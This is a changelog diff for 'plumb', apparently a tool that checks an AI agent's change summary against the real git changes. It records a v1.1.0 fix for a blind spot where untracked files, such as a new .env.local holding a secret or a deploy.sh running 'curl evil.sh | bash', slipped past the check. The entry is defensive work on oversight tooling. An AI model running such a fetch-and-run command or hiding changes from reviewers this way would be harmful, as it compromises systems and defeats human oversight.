@@ -5,6 +5,27 @@ Newest first.
 
 ---
 
+## 2026-08-03 — v1.1.0: the headline feature was broken
+
+- **Untracked files were invisible.** `git diff --name-status HEAD` never lists
+  them, so an agent that dropped a new `.env.local` with a secret, or a
+  `deploy.sh` running `curl evil.sh | bash`, got back *"the summary holds"* and
+  exit 0. The one thing this tool promises, missed — found by an adversarial
+  audit, not by the test suite, because every fixture only ever modified files
+  that were already tracked.
+- **Fixed** by merging `git ls-files --others --exclude-standard` into the changed
+  set, reported as status `U` ("new, untracked"). `.gitignore` is honoured, so
+  build output stays out.
+- **Regression test added** for exactly that scenario. A fixture that only ever
+  edits tracked files cannot catch this class of bug — new files need their own
+  case.
+- **The summary file no longer reports itself.** Saving `summary.md` inside the
+  repo being checked made it an untracked file, i.e. a guaranteed false positive
+  on every run.
+- **Lesson worth keeping:** the test suite passed throughout. Correctness for a
+  checking tool has to be proven against an adversary who is *trying* to hide
+  something, not against fixtures written by the author.
+
 ## 2026-08-01 — published, listed, launch drafted
 
 - **Public at [github.com/manpreet171/plumb](https://github.com/manpreet171/plumb)**,
